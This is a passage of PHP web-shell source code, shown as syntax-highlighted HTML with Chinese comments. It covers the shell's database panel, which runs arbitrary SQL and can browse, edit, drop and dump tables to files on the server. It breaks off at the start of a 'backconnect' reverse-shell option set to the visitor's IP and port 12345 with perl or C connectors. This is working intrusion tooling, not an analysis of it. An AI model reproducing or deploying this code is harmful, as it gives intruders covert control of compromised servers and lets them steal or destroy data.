</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            p(&#39;&lt;td&gt;&lt;b&gt;&#39; . $row[&#39;Field&#39;] . &#39;&lt;/b&gt;&lt;br /&gt;&#39; . $row[&#39;Type&#39;] . &#39;&lt;/td&gt;&lt;td&gt;&lt;textarea class=&#34;area&#34; name=&#34;insertsql[&#39; . $row[&#39;Field&#39;] . &#39;]&#34; style=&#34;width:500px;height:60px;overflow:auto;&#34;&gt;&#39; . $value . &#39;&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    if ($doing == &#39;insert&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;tr class=&#34;&#39; . bg() . &#39;&#34;&gt;&lt;td colspan=&#34;2&#34;&gt;&lt;input class=&#34;bt&#34; type=&#34;submit&#34; name=&#34;insert&#34; value=&#34;Insert&#34; /&gt;&lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;tr class=&#34;&#39; . bg() . &#39;&#34;&gt;&lt;td colspan=&#34;2&#34;&gt;&lt;input class=&#34;bt&#34; type=&#34;submit&#34; name=&#34;update&#34; value=&#34;Update&#34; /&gt;&lt;/td&gt;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        makehide(&#39;base64&#39;, $base64);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;/table&gt;&lt;/form&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $querys = @explode(&#39;;&#39;, $sql_query);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    foreach ($querys as $num =&gt; $query) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        if ($query) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            p(&#34;&lt;p&gt;&lt;b&gt;Query#{$num} : &#34; . htmlspecialchars($query, ENT_QUOTES) . &#34;&lt;/b&gt;&lt;/p&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            switch (qy($query)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                case 0:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    p(&#39;&lt;h2&gt;Error : &#39; . mysql_error() . &#39;&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    break;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                case 1:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    if (strtolower(substr($query, 0, 13)) == &#39;select * from&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $allowedit = 1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    if ($getnumsql) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $tatol = mysql_num_rows(q($getnumsql));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $multipage = multi($tatol, $pagenum, $page, $tablename);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    if (!$tablename) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $sql_line = str_replace(array(&#34;\r&#34;, &#34;\n&#34;, &#34;\t&#34;), array(&#39; &#39;, &#39; &#39;, &#39; &#39;), trim(htmlspecialchars($query)));
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $sql_line = preg_replace(&#34;/\/\*[^(\*\/)]*\*\//i&#34;, &#34; &#34;, $sql_line);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        preg_match_all(&#34;/from\s+`{0,1}([\w]+)`{0,1}\s+/i&#34;, $sql_line, $matches);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $tablename = $matches[1][0];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    /*********************/
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    $getfield = q(&#34;SHOW COLUMNS FROM $tablename&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    $rowdb = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    $keyfied = &#39;&#39;; //主键字段
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    while ($row = @mysql_fetch_assoc($getfield)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $rowdb[$row[&#39;Field&#39;]][&#39;Key&#39;] = $row[&#39;Key&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $rowdb[$row[&#39;Field&#39;]][&#39;Extra&#39;] = $row[&#39;Extra&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        if ($row[&#39;Key&#39;] == &#39;UNI&#39; || $row[&#39;Key&#39;] == &#39;PRI&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                            $keyfied = $row[&#39;Field&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    /*********************/
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    //直接浏览表按照主键降序排列
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    if ($keyfied &amp;&amp; strtolower(substr($query, 0, 13)) == &#39;select * from&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $query = str_replace(&#34; LIMIT &#34;, &#34; order by $keyfied DESC LIMIT &#34;, $query);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    $result = q($query);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    p($multipage);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    p(&#39;&lt;table border=&#34;0&#34; cellpadding=&#34;3&#34; cellspacing=&#34;0&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    p(&#39;&lt;tr class=&#34;head&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    if ($allowedit)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        p(&#39;&lt;td&gt;Action&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    $fieldnum = @mysql_num_fields($result);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    for ($i = 0; $i &lt; $fieldnum; $i++) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $name = @mysql_field_name($result, $i);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $type = @mysql_field_type($result, $i);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $len = @mysql_field_len($result, $i);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        p(&#34;&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)&#34; . (($rowdb[$name][&#39;Key&#39;] == &#39;UNI&#39; || $rowdb[$name][&#39;Key&#39;] == &#39;PRI&#39;) ? &#39;&lt;b&gt; - PRIMARY&lt;/b&gt;&#39; : &#39;&#39;) . ($rowdb[$name][&#39;Extra&#39;] == &#39;auto_increment&#39; ? &#39;&lt;b&gt; - Auto&lt;/b&gt;&#39; : &#39;&#39;) . &#34;&lt;/span&gt;&lt;/td&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    while ($mn = @mysql_fetch_assoc($result)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $thisbg = bg();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        p(&#39;&lt;tr class=&#34;&#39; . $thisbg . &#39;&#34; onmouseover=&#34;this.className=\&#39;focus\&#39;;&#34; onmouseout=&#34;this.className=\&#39;&#39; . $thisbg . &#39;\&#39;;&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $where = $tmp = $b1 = &#39;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        //选取条件字段用
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        foreach ($mn as $key =&gt; $inside) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                            if ($inside) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                                //查找主键、唯一属性、自动增加的字段，找到就停止，否则组合所有字段作为条件。
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                                if ($rowdb[$key][&#39;Key&#39;] == &#39;UNI&#39; || $rowdb[$key][&#39;Extra&#39;] == &#39;auto_increment&#39; || $rowdb[$key][&#39;Key&#39;] == &#39;PRI&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                                    $where = $key . &#34;=&#39;&#34; . addslashes($inside) . &#34;&#39;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                                    break;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                                $where .= $tmp . $key . &#34;=&#39;&#34; . addslashes($inside) . &#34;&#39;&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                                $tmp = &#39; AND &#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        //读取记录用
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        foreach ($mn as $key =&gt; $inside) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                            $b1 .= &#39;&lt;td nowrap&gt;&#39; . html_clean($inside) . &#39; &lt;/td&gt;&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $where = base64_encode($where);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        if ($allowedit)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                            p(&#39;&lt;td nowrap&gt;&lt;a href=&#34;javascript:editrecord(\&#39;edit\&#39;, \&#39;&#39; . $where . &#39;\&#39;, \&#39;&#39; . $tablename . &#39;\&#39;);&#34;&gt;Edit&lt;/a&gt; | &lt;a href=&#34;javascript:editrecord(\&#39;del\&#39;, \&#39;&#39; . $where . &#39;\&#39;, \&#39;&#39; . $tablename . &#39;\&#39;);&#34;&gt;Del&lt;/a&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        p($b1);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        unset($b1);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    p(&#39;&lt;tr class=&#34;head&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    if ($allowedit)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        p(&#39;&lt;td&gt;Action&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    $fieldnum = @mysql_num_fields($result);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    for ($i = 0; $i &lt; $fieldnum; $i++) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $name = @mysql_field_name($result, $i);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $type = @mysql_field_type($result, $i);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        $len = @mysql_field_len($result, $i);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                        p(&#34;&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)&#34; . (($rowdb[$name][&#39;Key&#39;] == &#39;UNI&#39; || $rowdb[$name][&#39;Key&#39;] == &#39;PRI&#39;) ? &#39;&lt;b&gt; - PRIMARY&lt;/b&gt;&#39; : &#39;&#39;) . ($rowdb[$name][&#39;Extra&#39;] == &#39;auto_increment&#39; ? &#39;&lt;b&gt; - Auto&lt;/b&gt;&#39; : &#39;&#39;) . &#34;&lt;/span&gt;&lt;/td&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    tbfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    p($multipage);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    break;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                case 2:
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    $ar = mysql_affected_rows();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    p(&#39;&lt;h2&gt;affected rows : &lt;b&gt;&#39; . $ar . &#39;&lt;/b&gt;&lt;/h2&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                                    break;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            } else {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $query = q(&#34;SHOW TABLE STATUS&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $table_num = $table_rows = $data_size = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $tabledb = array();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                while ($table = mysql_fetch_array($query)) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $data_size = $data_size + $table[&#39;Data_length&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $table_rows = $table_rows + $table[&#39;Rows&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $table[&#39;Data_length&#39;] = sizecount($table[&#39;Data_length&#39;]);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $table_num++;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $tabledb[] = $table;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                $data_size = sizecount($data_size);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                unset($table);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;table border=&#34;0&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;form action=&#34;&#39; . $self . &#39;&#34; method=&#34;POST&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                makehide(&#39;action&#39;, &#39;mysqladmin&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p($dbform);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;tr class=&#34;head&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td width=&#34;2%&#34; align=&#34;center&#34;&gt; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Name&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Rows&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Data_length&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Create_time&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Update_time&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if ($highver) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Engine&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Collation&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Operate&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                foreach ($tabledb as $key =&gt; $table) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    $thisbg = bg();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;tr class=&#34;&#39; . $thisbg . &#39;&#34; onmouseover=&#34;this.className=\&#39;focus\&#39;;&#34; onmouseout=&#34;this.className=\&#39;&#39; . $thisbg . &#39;\&#39;;&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td align=&#34;center&#34; width=&#34;2%&#34;&gt;&lt;input type=&#34;checkbox&#34; name=&#34;table[]&#34; value=&#34;&#39; . $table[&#39;Name&#39;] . &#39;&#34; /&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;&lt;a href=&#34;javascript:settable(\&#39;&#39; . $table[&#39;Name&#39;] . &#39;\&#39;);&#34;&gt;&#39; . $table[&#39;Name&#39;] . &#39;&lt;/a&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;&#39; . $table[&#39;Rows&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;&#39; . $table[&#39;Data_length&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;&#39; . $table[&#39;Create_time&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;&#39; . $table[&#39;Update_time&#39;] . &#39; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    if ($highver) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $table[&#39;Engine&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                        p(&#39;&lt;td&gt;&#39; . $table[&#39;Collation&#39;] . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;&lt;a href=&#34;javascript:settable(\&#39;&#39; . $table[&#39;Name&#39;] . &#39;\&#39;, \&#39;insert\&#39;);&#34;&gt;Insert&lt;/a&gt; | &lt;a href=&#34;javascript:settable(\&#39;&#39; . $table[&#39;Name&#39;] . &#39;\&#39;, \&#39;structure\&#39;);&#34;&gt;Structure&lt;/a&gt; | &lt;a href=&#34;javascript:settable(\&#39;&#39; . $table[&#39;Name&#39;] . &#39;\&#39;, \&#39;drop\&#39;);&#34;&gt;Drop&lt;/a&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;tr class=&#34;head&#34;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td width=&#34;2%&#34; align=&#34;center&#34;&gt;&lt;input name=&#34;chkall&#34; value=&#34;on&#34; type=&#34;checkbox&#34; onclick=&#34;CheckAll(this.form)&#34; /&gt;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Name&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Rows&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Data_length&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Create_time&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Update_time&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                if ($highver) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Engine&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                    p(&#39;&lt;td&gt;Collation&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Operate&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;tr class=&#39; . bg() . &#39;&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;Total tables: &#39; . $table_num . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;&#39; . $table_rows . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td&gt;&#39; . $data_size . &#39;&lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;td colspan=&#34;&#39; . ($highver ? 5 : 3) . &#39;&#34;&gt; &lt;/td&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#39;&lt;/tr&gt;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#34;&lt;tr class=\&#34;&#34; . bg() . &#34;\&#34;&gt;&lt;td colspan=\&#34;&#34; . ($highver ? 9 : 7) . &#34;\&#34;&gt;&lt;input name=\&#34;saveasfile\&#34; value=\&#34;1\&#34; type=\&#34;checkbox\&#34; /&gt; Save as file &lt;input class=\&#34;input\&#34; name=\&#34;path\&#34; value=\&#34;&#34; . SA_ROOT . $dbname . &#34;.sql\&#34; type=\&#34;text\&#34; size=\&#34;60\&#34; /&gt; &lt;input class=\&#34;bt\&#34; type=\&#34;submit\&#34; value=\&#34;Export selection table\&#34; /&gt;&lt;/td&gt;&lt;/tr&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                makehide(&#39;doing&#39;, &#39;backupmysql&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                formfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                p(&#34;&lt;/table&gt;&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                                fr($query);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    tbfoot();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    @mysql_close();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                } //end mysql
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                elseif ($action == &#39;backconnect&#39;) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$yourip &amp;&amp; $yourip = $_SERVER[&#39;REMOTE_ADDR&#39;];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    !$yourport &amp;&amp; $yourport = &#39;12345&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    $usedb = array(&#39;perl&#39; =&gt; &#39;perl&#39;, &#39;c&#39; =&gt; &#39;c&#39;);
